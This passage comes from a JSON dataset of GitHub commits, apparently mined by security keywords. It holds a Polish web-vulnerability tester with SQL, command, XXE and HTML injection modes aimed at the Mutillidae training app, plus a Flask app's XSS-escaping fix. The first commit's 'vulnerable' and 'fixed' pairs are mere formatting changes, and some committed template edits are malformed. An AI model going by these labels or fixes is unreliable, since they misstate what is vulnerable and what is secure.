\"parametr=wartosc\"',\n     )\n     parser.add_argument(\n         \"--sqli\",\ndiff --git a/skrypty/Tester/config.json.template b/skrypty/Tester/config.json.template\nnew file mode 100644\nindex 0000000..ba537a6\n--- /dev/null\n+++ b/skrypty/Tester/config.json.template\n@@ -0,0 +1,3 @@\n+{\n+    \"server_ip\": \"127.0.0.1\"\n+}\ndiff --git a/skrypty/Tester/config_tamplate.json b/skrypty/Tester/config_tamplate.json\ndeleted file mode 100644\nindex 89adafd..0000000\n--- a/skrypty/Tester/config_tamplate.json\n+++ /dev/null\n@@ -1,4 +0,0 @@\n-{\n-    \"server_ip\": \"...\",\n-    \"sleep_time\": 3\n-}\ndiff --git a/skrypty/Tester/modules/MutillidaeA3XSS.py b/skrypty/Tester/modules/MutillidaeA3XSS.py\nindex 35f8d2f..3c117cf 100644\n--- a/skrypty/Tester/modules/MutillidaeA3XSS.py\n+++ b/skrypty/Tester/modules/MutillidaeA3XSS.py\n@@ -39,6 +39,9 @@ def xss_persistent(\n             print(\"XSS Persistent successfull!\")\n             return True\n     except UnexpectedAlertPresentException as e:\n+        print(\n+            \"Persistent XSS has already been used on this page and triggered alert when loading the page.\"\n+        )\n         print(e)\n         return True\n     except TimeoutException:\n",
            "message": "",
            "files": {
                "/skrypty/Tester/CompareDiff.py": {
                    "changes": [
                        {
                            "diff": "\n     soup = BeautifulSoup(page.content, \"html.parser\")\n     return str(soup)\n \n+\n def get_page_htmli_cookie(url, data):\n     page = requests.get(url, cookies=data, verify=False)\n     soup = BeautifulSoup(page.content, \"html.parser\")\n     return str(soup)\n \n+\n def compare_page_htmli(url, inj, cookie):\n     page_text_normal = get_page_text(url)\n     if cookie == False:\n-        header = {\n-        \"User-Agent\": inj\n-        }\n+        header = {\"User-Agent\": inj}\n         page = get_page_htmli_header(url, header)\n     else:\n         get_header = requests.get(url)\n         get_cookie = get_header.cookies\n-        get_cookie_name = list(get_cookie.keys())[0] #ostatni\n+        get_cookie_name = list(get_cookie.keys())[0]  # ostatni\n         get_cookie.update({get_cookie_name: get_cookie.get(get_cookie_name) + inj})\n         page = get_page_htmli_cookie(url, get_cookie)\n-   \n+\n     diff = difflib.unified_diff(\n         page_text_normal.splitlines(), page.splitlines(), lineterm=\"\"\n     )",
                            "add": 5,
                            "remove": 5,
                            "filename": "/skrypty/Tester/CompareDiff.py",
                            "badparts": [
                                "        header = {",
                                "        \"User-Agent\": inj",
                                "        }",
                                "        get_cookie_name = list(get_cookie.keys())[0] #ostatni"
                            ],
                            "goodparts": [
                                "        header = {\"User-Agent\": inj}",
                                "        get_cookie_name = list(get_cookie.keys())[0]  # ostatni"
                            ]
                        }
                    ],
                    "source": "\nimport requests from bs4 import BeautifulSoup import difflib import random import string import re def generate_random_value(): return \"\".join(random.choices(string.ascii_letters +string.digits, k=12)) def get_page_text(url): page=requests.get(url, verify=False) soup=BeautifulSoup(page.content, \"html.parser\") return str(soup) def post_page_text(url, data): page=requests.post(url, data=data, verify=False) soup=BeautifulSoup(page.content, \"html.parser\") return str(soup) def get_page_htmli_header(url, data): page=requests.get(url, headers=data, verify=False) soup=BeautifulSoup(page.content, \"html.parser\") return str(soup) def get_page_htmli_cookie(url, data): page=requests.get(url, cookies=data, verify=False) soup=BeautifulSoup(page.content, \"html.parser\") return str(soup) def compare_page_htmli(url, inj, cookie): page_text_normal=get_page_text(url) if cookie==False: header={ \"User-Agent\": inj } page=get_page_htmli_header(url, header) else: get_header=requests.get(url) get_cookie=get_header.cookies get_cookie_name=list(get_cookie.keys())[0] get_cookie.update({get_cookie_name: get_cookie.get(get_cookie_name) +inj}) page=get_page_htmli_cookie(url, get_cookie) diff=difflib.unified_diff( page_text_normal.splitlines(), page.splitlines(), lineterm=\"\" ) output=\"\\n\".join(diff) regex=r\"<img([\\w\\W]+?)/>\" return re.findall(regex, output) def compare_pages_post(url1, data, regex=r\">([^<]+)<\"): page_text1=get_page_text(url1) page_text2=post_page_text(url1, data) diff=difflib.unified_diff( page_text1.splitlines(), page_text2.splitlines(), lineterm=\"\" ) output=\"\\n\".join(diff) return re.findall(regex, output) def compare_pages(url1, url2, regex=r\">([^<]+)<\"): page_text1=get_page_text(url1) page_text2=get_page_text(url2) diff=difflib.unified_diff( page_text1.splitlines(), page_text2.splitlines(), lineterm=\"\" ) output=\"\\n\".join(diff) return re.findall(regex, output) def list_to_dict(list): result={} for item in list: key, value=item.split(\":\", 1) key=key.strip().strip(\"'\") value=value.strip().strip(\"'\") result[key]=value return result def find_forms(url): response=requests.get(url) soup=BeautifulSoup(response.content, \"html.parser\") forms=soup.find_all(\"form\") form_data=[] for form in forms: form_details={} inputs=form.find_all([\"input\", \"textarea\", \"select\"]) for input_element in inputs: name=input_element.get(\"name\") value=input_element.get(\"value\", \"\") if name: form_details[name]=value form_data.append(form_details) return form_data def generate_data_forms(form_data, custom_value): full_forms=[] random_value=generate_random_value() for form_details in form_data: filled_form={} keys=list(form_details.keys()) if \"page\" in keys: page_index=keys.index(\"page\") else: page_index=-1 for idx, key in enumerate(keys): if key==\"page\": filled_form[key]=form_details[key] elif idx==page_index +1: filled_form[key]=custom_value else: filled_form[key]=random_value full_forms.append(filled_form) return full_forms ",
                    "sourceWithComments": "import requests\nfrom bs4 import BeautifulSoup\nimport difflib\nimport random\nimport string\nimport re\n\n\n# source: https://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits\ndef generate_random_value():\n    return \"\".join(random.choices(string.ascii_letters + string.digits, k=12))\n\n\ndef get_page_text(url):\n    page = requests.get(url, verify=False)\n    soup = BeautifulSoup(page.content, \"html.parser\")\n    return str(soup)\n\n\ndef post_page_text(url, data):\n    page = requests.post(url, data=data, verify=False)\n    soup = BeautifulSoup(page.content, \"html.parser\")\n    return str(soup)\n\n\ndef get_page_htmli_header(url, data):\n    page = requests.get(url, headers=data, verify=False)\n    soup = BeautifulSoup(page.content, \"html.parser\")\n    return str(soup)\n\ndef get_page_htmli_cookie(url, data):\n    page = requests.get(url, cookies=data, verify=False)\n    soup = BeautifulSoup(page.content, \"html.parser\")\n    return str(soup)\n\ndef compare_page_htmli(url, inj, cookie):\n    page_text_normal = get_page_text(url)\n    if cookie == False:\n        header = {\n        \"User-Agent\": inj\n        }\n        page = get_page_htmli_header(url, header)\n    else:\n        get_header = requests.get(url)\n        get_cookie = get_header.cookies\n        get_cookie_name = list(get_cookie.keys())[0] #ostatni\n        get_cookie.update({get_cookie_name: get_cookie.get(get_cookie_name) + inj})\n        page = get_page_htmli_cookie(url, get_cookie)\n   \n    diff = difflib.unified_diff(\n        page_text_normal.splitlines(), page.splitlines(), lineterm=\"\"\n    )\n\n    output = \"\\n\".join(diff)\n    regex = r\"<img([\\w\\W]+?)/>\"\n\n    return re.findall(regex, output)\n\n\ndef compare_pages_post(url1, data, regex=r\">([^<]+)<\"):\n    page_text1 = get_page_text(url1)\n    page_text2 = post_page_text(url1, data)\n\n    # source https://docs.python.org/3/library/difflib.html\n    diff = difflib.unified_diff(\n        page_text1.splitlines(), page_text2.splitlines(), lineterm=\"\"\n    )\n\n    output = \"\\n\".join(diff)\n\n    return re.findall(regex, output)\n\n\ndef compare_pages(url1, url2, regex=r\">([^<]+)<\"):\n    page_text1 = get_page_text(url1)\n    page_text2 = get_page_text(url2)\n\n    # source https://docs.python.org/3/library/difflib.html\n    diff = difflib.unified_diff(\n        page_text1.splitlines(), page_text2.splitlines(), lineterm=\"\"\n    )\n\n    output = \"\\n\".join(diff)\n\n    return re.findall(regex, output)\n\n\ndef list_to_dict(list):\n    result = {}\n\n    for item in list:\n        key, value = item.split(\":\", 1)\n        key = key.strip().strip(\"'\")\n        value = value.strip().strip(\"'\")\n        result[key] = value\n\n    return result\n\n\ndef find_forms(url):\n    response = requests.get(url)\n    soup = BeautifulSoup(response.content, \"html.parser\")\n    forms = soup.find_all(\"form\")\n    form_data = []\n\n    for form in forms:\n        form_details = {}\n        inputs = form.find_all([\"input\", \"textarea\", \"select\"])\n\n        for input_element in inputs:\n            name = input_element.get(\"name\")\n            value = input_element.get(\"value\", \"\")\n\n            if name:\n                form_details[name] = value\n\n        form_data.append(form_details)\n\n    return form_data\n\n\ndef generate_data_forms(form_data, custom_value):\n    full_forms = []\n    random_value = generate_random_value()\n    for form_details in form_data:\n        filled_form = {}\n        keys = list(form_details.keys())\n        if \"page\" in keys:\n            page_index = keys.index(\"page\")\n        else:\n            page_index = -1\n        for idx, key in enumerate(keys):\n            if key == \"page\":\n                filled_form[key] = form_details[key]\n            elif idx == page_index + 1:\n                filled_form[key] = custom_value\n            else:\n                filled_form[key] = random_value\n\n            full_forms.append(filled_form)\n\n    return full_forms\n"
                },
                "/skrypty/Tester/Tester.py": {
                    "changes": [
                        {
                            "diff": "\n \n def main():\n     parser = argparse.ArgumentParser(description=\"Por\u00f3wnuje dwie strony HTML.\")\n-    parser.add_argument(\"--url\", type=str, help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\")\n+    parser.add_argument(\n+        \"--url\",\n+        type=str,\n+        help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\",\n+    )\n     parser.add_argument(\"--http-polution\", action=\"store_true\", help=\"HTTP polution\")\n     parser.add_argument(\n-        \"--parameter\", nargs=\"*\", type=str, help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"'\n+        \"--parameter\",\n+        nargs=\"*\",\n+        type=str,\n+        help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"',\n     )\n     parser.add_argument(\n         \"--sqli",
                            "add": 9,
                            "remove": 2,
                            "filename": "/skrypty/Tester/Tester.py",
                            "badparts": [
                                "    parser.add_argument(\"--url\", type=str, help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\")",
                                "        \"--parameter\", nargs=\"*\", type=str, help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"'"
                            ],
                            "goodparts": [
                                "    parser.add_argument(",
                                "        \"--url\",",
                                "        type=str,",
                                "        help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\",",
                                "    )",
                                "        \"--parameter\",",
                                "        nargs=\"*\",",
                                "        type=str,",
                                "        help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"',"
                            ]
                        }
                    ],
                    "source": "\nimport argparse from Exploitation import http_pollution, sqlinjection, command_inj, xmleei, htmli def main(): parser=argparse.ArgumentParser(description=\"Por\u00f3wnuje dwie strony HTML.\") parser.add_argument(\"--url\", type=str, help=\"Adres URL strony(wraz z parametrem je\u017celi http_polution)\") parser.add_argument(\"--http-polution\", action=\"store_true\", help=\"HTTP polution\") parser.add_argument( \"--parameter\", nargs=\"*\", type=str, help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"' ) parser.add_argument( \"--sqli\", type=str, nargs=\"?\", const=\"Normal\", help='SQLI via POST: aktualnie wspierane: \"Normal\", \"Insert\", \"Timing\"', ) parser.add_argument( \"--comminj\", type=str, nargs=\"?\", const=\"AND\", help='Command Injection: aktualnie wspierane: \"AND\", \"DoubleAND\", \"OR\"', ) parser.add_argument( \"--xmleei\", action=\"store_true\", help=\"XML External Entity Injection\" ) parser.add_argument( \"--htmli\", type=str, nargs=\"?\", const=\"Onsite\", help='HTML Injection: aktualnie wspierane: \"Onsite\", \"Header\", \"Cookie\"', ) parser.add_argument(\"--autoforms\", action=\"store_true\", help=\"Scrap all forms\") parser.add_argument(\"--postdata\", nargs=\"*\", help=\"Post Data\") args=parser.parse_args() if args.http_polution: print(http_pollution(args.url, args.parameter)) elif args.sqli: print(sqlinjection(args.url, args.sqli, args.autoforms, args.postdata)) elif args.comminj: print(command_inj(args.url, args.comminj, args.autoforms, args.postdata)) elif args.xmleei: print(xmleei(args.url, args.autoforms, args.postdata)) elif args.htmli: print(htmli(args.url, args.htmli, args.autoforms)) else: print(\"Nie podano odpowiedniego argumentu.\") if __name__==\"__main__\": main() ",
                    "sourceWithComments": "import argparse\nfrom Exploitation import http_pollution, sqlinjection, command_inj, xmleei, htmli\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Por\u00f3wnuje dwie strony HTML.\")\n    parser.add_argument(\"--url\", type=str, help=\"Adres URL strony (wraz z parametrem je\u017celi http_polution)\")\n    parser.add_argument(\"--http-polution\", action=\"store_true\", help=\"HTTP polution\")\n    parser.add_argument(\n        \"--parameter\", nargs=\"*\", type=str, help='Podaj parametry GET po spacjach w formacie \"parametr=wartosc\"'\n    )\n    parser.add_argument(\n        \"--sqli\",\n        type=str,\n        nargs=\"?\",\n        const=\"Normal\",\n        help='SQLI via POST: aktualnie wspierane: \"Normal\", \"Insert\", \"Timing\"',\n    )\n    parser.add_argument(\n        \"--comminj\",\n        type=str,\n        nargs=\"?\",\n        const=\"AND\",\n        help='Command Injection: aktualnie wspierane: \"AND\", \"DoubleAND\", \"OR\"',\n    )\n    parser.add_argument(\n        \"--xmleei\", action=\"store_true\", help=\"XML External Entity Injection\"\n    )\n    parser.add_argument(\n        \"--htmli\",\n        type=str,\n        nargs=\"?\",\n        const=\"Onsite\",\n        help='HTML Injection: aktualnie wspierane: \"Onsite\", \"Header\", \"Cookie\"',\n    )\n    parser.add_argument(\"--autoforms\", action=\"store_true\", help=\"Scrap all forms\")\n    parser.add_argument(\"--postdata\", nargs=\"*\", help=\"Post Data\")\n    args = parser.parse_args()\n\n    if args.http_polution:\n        print(http_pollution(args.url, args.parameter))\n    elif args.sqli:\n        print(sqlinjection(args.url, args.sqli, args.autoforms, args.postdata))\n    elif args.comminj:\n        print(command_inj(args.url, args.comminj, args.autoforms, args.postdata))\n    elif args.xmleei:\n        print(xmleei(args.url, args.autoforms, args.postdata))\n    elif args.htmli:\n        print(htmli(args.url, args.htmli, args.autoforms))\n    else:\n        print(\"Nie podano odpowiedniego argumentu.\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
                }
            },
            "msg": "Run black, add message on unexpected alert on persistent xss page, rename and change config template"
        }
    },
    "https://github.com/uchicago-capp-30320/new-arrivals-chi": {
        "622876d56284c55345810162f831ad9cf3b1fdf7": {
            "url": "https://api.github.com/repos/uchicago-capp-30320/new-arrivals-chi/commits/622876d56284c55345810162f831ad9cf3b1fdf7",
            "html_url": "https://github.com/uchicago-capp-30320/new-arrivals-chi/commit/622876d56284c55345810162f831ad9cf3b1fdf7",
            "sha": "622876d56284c55345810162f831ad9cf3b1fdf7",
            "keyword": "XSS malicious",
            "diff": "diff --git a/new_arrivals_chi/app/authorize_routes.py b/new_arrivals_chi/app/authorize_routes.py\nindex 63d1011b..58f529ab 100644\n--- a/new_arrivals_chi/app/authorize_routes.py\n+++ b/new_arrivals_chi/app/authorize_routes.py\n@@ -16,7 +16,7 @@\n     * post_change_password - Executes change password logic.\n \n Last updated:\n-@Author: Madeleine Roberts @MadeleineKRoberts\n+@Author: Kathryn Link-Oberstar @klinkoberstar\n @Date: 05/09/2024\n \n Creation:\n@@ -24,6 +24,8 @@\n @Date: 05/01/2024\n \"\"\"\n \n+import bleach\n+from markupsafe import escape\n from flask import Blueprint, render_template, redirect, url_for, request, flash\n from new_arrivals_chi.app.database import User\n from new_arrivals_chi.app.utils import (\n@@ -50,7 +52,7 @@ def signup():\n     Returns:\n         Renders sign up page in their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"signup.html\", language=language)\n \n \n@@ -70,17 +72,17 @@ def signup_post():\n \n     # ensure that input meets requirments\n     if not validate_email_syntax(email):\n-        flash(\"Please enter a valid email address\")\n+        flash(escape(\"Please enter a valid email address\"))\n \n     elif User.query.filter_by(email=email).first():\n         # email already exists in database\n-        flash(\"Email address already exists for user\")\n+        flash(escape(\"Email address already exists for user\"))\n \n     elif not password == password_confirm:\n-        flash(\"Passwords do not match. Try again\")\n+        flash(escape(\"Passwords do not match. Try again\"))\n \n     elif not validate_password(password):\n-        flash(\"Please enter a valid password\")\n+        flash(escape(\"Please enter a valid password\"))\n \n     else:\n         # Meets all sign up requirements\n@@ -100,7 +102,7 @@ def login():\n     Returns:\n         Renders login page for user with their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"login.html\", language=language)\n \n \n@@ -120,7 +122,7 @@ def login_post():\n \n     # check if the user actually exists & password is correct\n     if not user or not verify_password(user.password, password):\n-        flash(\"Please check your login details and try again.\")\n+        flash(escape(\"Please check your login details and try again.\"))\n         return redirect(\n             url_for(\"authorize.login\")\n         )  # if the user doesn't exist or password is wrong, reload the page\n@@ -154,7 +156,7 @@ def change_password():\n     Returns:\n         Renders change password page for user with their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"change_password.html\", language=language)\n \n \n@@ -173,21 +175,23 @@ def post_change_password():\n     )\n \n     if not verify_password(current_user.password, old_password):\n-        flash(\"Wrong existing password. Try again\")\n+        flash(escape(\"Wrong existing password. Try again\"))\n \n     elif old_password == new_password:\n         # Do not need to check password hash because old password is correct\n-        flash(\"New password cannot be the same as your previous password.\")\n+        flash(\n+            escape(\"New password cannot be the same as your previous password.\")\n+        )\n \n     elif not new_password == new_password_confirm:\n-        flash(\"New passwords do not match. Try again\")\n+        flash(escape(\"New passwords do not match. Try again\"))\n \n     elif not validate_password(new_password):\n-        flash(\"New password does not meet requirements. Try again.\")\n+        flash(escape(\"New password does not meet requirements. Try again.\"))\n \n     else:\n         change_db_password(new_password)\n-        flash(\"Password change successful.\")\n+        flash(escape(\"Password change successful.\"))\n         return redirect(url_for(\"main.profile\"))\n \n     return redirect(url_for(\"authorize.change_password\"))\ndiff --git a/new_arrivals_chi/app/main.py b/new_arrivals_chi/app/main.py\nindex 6843a750..864eb603 100644\n--- a/new_arrivals_chi/app/main.py\n+++ b/new_arrivals_chi/app/main.py\n@@ -23,6 +23,7 @@\n \n from flask import Flask, Blueprint, render_template, request\n import os\n+import bleach\n from dotenv import load_dotenv\n from new_arrivals_chi.app.database import db, User\n from flask_migrate import Migrate\n@@ -47,7 +48,7 @@ def home():\n     Returns:\n         Renders home page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"home.html\", language=language)\n \n \n@@ -61,7 +62,7 @@ def profile():\n     Returns:\n         Renders profile page for user with in their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"profile.html\", language=language)\n \n \n@@ -74,7 +75,7 @@ def legal():\n     Returns:\n         Renders main legal page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"legal.html\", language=language)\n \n \n@@ -87,7 +88,7 @@ def health():\n     Returns:\n         Renders main health page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"health.html\", language=language)\n \n \n@@ -101,7 +102,7 @@ def health_search():\n     Returns:\n         Renders the health search page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"health_search.html\", language=language)\n \n \n@@ -114,7 +115,7 @@ def info():\n     Returns:\n         Renders information of an organization.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"info.html\", language=language)\n \n \ndiff --git a/new_arrivals_chi/app/templates/base.html b/new_arrivals_chi/app/templates/base.html\nindex e529a12a..a9184266 100644\n--- a/new_arrivals_chi/app/templates/base.html\n+++ b/new_arrivals_chi/app/templates/base.html\n@@ -17,7 +17,7 @@\n Madeleine Roberts @MadeleineKRoberts\n -->\n <!DOCTYPE html>\n-<html lang=\"{{ language }}\">\n+<html lang=\"{{ language | escape }}\">\n <head>\n     <meta charset=\"UTF-8\">\n     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n@@ -30,21 +30,21 @@\n \n <body>\n     <nav class=\"navbar\" style=\"position: absolute; top: 20px; left: 20px;\">\n-        <button onclick=\"navigateTo('/', '{{ language }}')\" class=\"navbar-item\">{{ 'Home' if language == 'en' else 'P\u00e1gina de inicio' }}</button>\n+        <button onclick=\"navigateTo('/', '{{ language | escape }}')\" class=\"navbar-item\">{{ 'Home' if language == 'en' else 'P\u00e1gina de inicio' | escape }}</button>\n         {% if current_user.is_authenticated %}\n-        <button onclick=\"navigateTo('/profile', '{{ language }}')\" class=\"navbar-item\">{{ 'Profile' if language == 'en' else 'Perfil' }}</button>\n-        <button onclick=\"navigateTo('/logout', '{{ language }}')\" class=\"navbar-item\">{{ 'Logout' if language == 'en' else 'Cerrar sesi\u00f3n' }}</button>\n+        <button onclick=\"navigateTo('/profile', '{{ language | escape }}')\" class=\"navbar-item\">{{ 'Profile' if language == 'en' else 'Perfil' | escape }}</button>\n+        <button onclick=\"navigateTo('/logout', '{{ language | escape }}')\" class=\"navbar-item\">{{ 'Logout' if language == 'en' else 'Cerrar sesi\u00f3n' | escape }}</button>\n         {% endif %}\n         {% if not current_user.is_authenticated %}\n-        <button onclick=\"navigateTo('/login', '{{ language }}')\" class=\"navbar-item\">{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' }}</button>\n-        <button onclick=\"navigateTo('/signup', '{{ language }}')\" class=\"navbar-item\">{{ 'Sign Up' if language == 'en' else 'Registrar' }}</button>\n+        <button onclick=\"navigateTo('/login', '{{ language | escape }}')\" class=\"navbar-item\">{{ 'Login' if language == 'en' else 'Iniciar sesi\u00f3n' | escape }}</button>\n+        <button onclick=\"navigateTo('/signup', '{{ language | escape }}')\" class=\"navbar-item\">{{ 'Sign Up' if language == 'en' else 'Registrar' | escape }}</button>\n         {% endif %}\n     </nav>\n </body>\n \n <form action=\"/\" method=\"GET\">\n-    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' }}</button>\n-    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' }}\">\n+    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' | escape }}</button>\n+    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' | escape }}\">\n </form>\n \n <div class=\"container has-text-centered\">\n@@ -53,7 +53,7 @@\n  </div>\n \n  <p class=\"report-error\">\n-    <a href=\"/report-error\">{{ 'Reportar error del sitio web' if language == 'es' else 'Report website error' }}</a> <i class=\"fas fa-bug\"></i>\n+    <a href=\"/report-error\">{{ 'Reportar error del sitio web' if language == 'es' else 'Report website error' | escape }}</a> <i class=\"fas fa-bug\"></i>\n </p>\n \n </html>\ndiff --git a/new_arrivals_chi/app/templates/change_password.html b/new_arrivals_chi/app/templates/change_password.html\nindex bd23a0d3..582ddb44 100644\n--- a/new_arrivals_chi/app/templates/change_password.html\n+++ b/new_arrivals_chi/app/templates/change_password.html\n@@ -18,14 +18,14 @@\n \n <div class=\"column is-4 is-offset-4\">\n     <h3 class=\"title\">\n-        {{ 'Change Password' if language == 'en' else 'Cambiar su contrase\u00f1a' }}\n+        {{ 'Change Password' if language == 'en' else 'Cambiar su contrase\u00f1a' | escape }}\n         </h3>\n     <div class=\"box\">\n         <form method=\"POST\" action=\"/change_password\">\n             {% with messages = get_flashed_messages() %}\n             {% if messages %}\n                 <div class=\"notification is-danger\">\n-                    {{ messages[0] }}.</a>.\n+                    {{ messages[0] | escape }}.</a>.\n                 </div>\n             {% endif %}\n             {% endwith %}\n@@ -33,28 +33,28 @@ <h3 class=\"title\">\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"old_password\" placeholder=\"{{ 'Old Password' if language == 'en' else 'Contrase\u00f1a anterior' }}\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"old_password\" placeholder=\"{{ 'Old Password' if language == 'en' else 'Contrase\u00f1a anterior' | escape }} \"oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"new_password\" placeholder=\"{{ 'New Password' if language == 'en' else 'Contrase\u00f1a nueva' }}\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"new_password\" placeholder=\"{{ 'New Password' if language == 'en' else 'Contrase\u00f1a nueva' | escape }}\"> oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n \n             <div class=\"field\">\n                 <div class=\"control\">\n-                    <input class=\"input is-large\" type=\"password\" name=\"new_password_confirm\" placeholder=\"{{ 'New Password' if language == 'en' else 'Contrase\u00f1a nueva' }}\" oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n+                    <input class=\"input is-large\" type=\"password\" name=\"new_password_confirm\" placeholder=\"{{ 'New Password' if language == 'en' else 'Contrase\u00f1a nueva' | escape }}\">  oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\">\n                 </div>\n             </div>\n \n             {{ 'Your password must include at least one uppercase letter, one lowercase letter, one number, one special symbol, and be longer than 8 characters.'\n                     if language == 'en' else\n                     'Su contrase\u00f1a debe incluir al menos una letra may\u00fascula, una letra min\u00fascula, un n\u00famero, un s\u00edmbolo especial y tener m\u00e1s de 8 caracteres.'\n-            }}\n+            | escape }}\n \n-            <button class=\"button is-block is-info is-large is-fullwidth\">{{ 'Change Password' if language == 'en' else 'Cambiar su contrase\u00f1a' }}</button>\n+            <button class=\"button is-block is-info is-large is-fullwidth\">{{ 'Change Password' if language == 'en' else 'Cambiar su contrase\u00f1a' | escape }}</button>\n         </form>\n     </div>\n </div>\ndiff --git a/new_arrivals_chi/app/templates/health.html b/new_arrivals_chi/app/templates/health.html\nindex 15f11efc..8f049092 100644\n--- a/new_arrivals_chi/app/templates/health.html\n+++ b/new_arrivals_chi/app/templates/health.html\n@@ -19,20 +19,20 @@\n {% block content %}\n \n     <form action=\"/health\" method=\"GET\">\n-        <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' }}</button>\n-        <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' }}\">\n+        <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' | escape }}</button>\n+        <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' | escape }}\">\n     </form>\n     <div class=\"box\">\n-        <div class=\"box-big-title\">{{ 'Informaci\u00f3n M\u00e9dica' if language == 'es' else 'Health Information' }}</div>\n-        <div class=\"box-title\">{{ 'Quiero...' if language == 'es' else 'I want to...' }} </div>\n+        <div class=\"box-big-title\">{{ 'Informaci\u00f3n M\u00e9dica' if language == 'es' else 'Health Information' | escape }}</div>\n+        <div class=\"box-title\">{{ 'Quiero...' if language == 'es' else 'I want to...' | escape }} </div>\n         <div class=\"button-container\">\n-            <button class=\"button orange\" onclick=\"navigateTo('/health/search', '{{ language }}')\">\n-                {{ 'Recibe Asistencia Inmediata' if language == 'es' else 'Receive Assistance Now' }}\n+            <button class=\"button orange\" onclick=\"navigateTo('/health/search', '{{ language | escape }}')\">\n+                {{ 'Recibe Asistencia Inmediata' if language == 'es' else 'Receive Assistance Now' | escape }}\n               </button>\n-            <button class=\"button green\">{{ 'Aprende M\u00e1s de Otros Recursos' else 'Learn More About Resources' }}</button>\n-            <button class=\"yellow-button\">{{ 'Algo m\u00e1s' if language == 'es' else 'Something else' }}</button>\n+            <button class=\"button green\">{{ 'Aprende M\u00e1s de Otros Recursos' else 'Learn More About Resources' | escape }}</button>\n+            <button class=\"yellow-button\">{{ 'Algo m\u00e1s' if language == 'es' else 'Something else' | escape }}</button>\n             <p class=\"bottom-left\">\n-                <a href=\"/\">{{ '< Regresar' if language == 'es' else '< Back' }}</a>\n+                <a href=\"/\">{{ '< Regresar' if language == 'es' else '< Back' | escape }}</a>\n             </p>\n             <p>\n         </div>\ndiff --git a/new_arrivals_chi/app/templates/health_search.html b/new_arrivals_chi/app/templates/health_search.html\nindex 95b0f12c..4ae4054a 100644\n--- a/new_arrivals_chi/app/templates/health_search.html\n+++ b/new_arrivals_chi/app/templates/health_search.html\n@@ -18,8 +18,8 @@\n \n {% block content %}\n <form action=\"/health/search\" method=\"GET\">\n-    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' }}</button>\n-    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' }}\">\n+    <button type=\"submit\" class=\"language-button\">{{ 'Espa\u00f1ol' if language == 'en' else 'English' | escape }}</button>\n+    <input type=\"hidden\" name=\"lang\" value=\"{{ 'es' if language == 'en' else 'en' | escape }}\">\n </form>\n <h1>Placeholder for search interface</h1>\n {% endblock %}\ndiff --git a/new_arrivals_chi/app/templates/home.html b/new_arrivals_chi/app/templates/home.html\nindex 07d17855..aef4e218 100644\n--- a/new_arrivals_chi/app/templates/home.html\n+++ b/new_arrivals_chi/app/templates/home.html\n@@ -18,12 +18,12 @@\n \n {% block content %}\n \n-    <h1>{{ 'Bienvenido' if language == 'es' else 'Welcome' }}</h1>\n-    <p>{{ 'Encuentra apoyo para tus necesidades legales, de salud o de comida.' if language == 'es' else 'Find essential support for legal, health, and food needs.' }}</p>\n-    <p>{{ 'Por favor haz click abajo para comenzar:' 